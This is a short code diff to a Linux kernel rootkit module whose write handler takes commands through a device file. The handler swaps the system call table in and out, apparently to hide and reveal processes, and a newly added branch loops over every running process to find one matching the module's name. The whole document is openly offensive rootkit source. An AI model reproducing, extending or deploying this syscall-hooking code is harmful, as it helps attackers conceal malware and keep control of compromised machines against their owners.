@@ -1,4 +1,4 @@
-#include "ker_mod.h"
+#include "ninartk.h"
 
 static const struct file_operations rootkit_fops = {
 		.owner = THIS_MODULE,
@@ -131,11 +131,16 @@ static ssize_t rtkit_write(struct file *file, const char __user *buffer,
 				new_systable();
 		} else if(!strncmp(buffer, SHOW_PID_CMD, strlen(SHOW_PID_CMD))) {
 				old_systable();
-		/*} else if(!strncmp(buffer, KILL_NINA_PID, strlen(KILL_NINA_PID))) {
-				kill(nina_pid, SIGINT);*/
-		} else {
-				/* nina_pid = buffer; */
-				printk(KERN_INFO "pid received : %s",nina_pid);
+		} else if(!strncmp(buffer, KILL_NINA_PID, strlen(KILL_NINA_PID))) {
+				old_systable();
+				struct task_struct *p;
+				for_each_process(p) {
+						if(strncmp(p->comm, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
+							printk(KERN_INFO "killing %s\n", p->comm);
+							//do_send_sig_info(SIGQUIT, SEND_SIG_PRIV, p, false);
+						}
+				}
+				new_systable();
 		}
 		return count;
 }
